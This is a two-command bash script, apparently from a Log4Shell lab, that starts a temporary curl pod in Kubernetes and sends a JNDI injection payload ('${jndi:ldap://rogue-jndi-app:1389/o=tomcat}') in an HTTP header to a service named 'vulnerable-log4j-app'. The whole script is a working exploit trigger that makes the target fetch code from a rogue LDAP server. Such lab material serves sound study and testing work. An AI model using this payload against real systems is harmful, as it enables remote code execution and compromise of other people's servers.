#!/bin/bash

kubectl run my-shell2 --rm -i --tty --image curlimages/curl -- sh
curl vulnerable-log4j-app:8080 -H 'X-Api-Version: ${jndi:ldap://rogue-jndi-app:1389/o=tomcat}'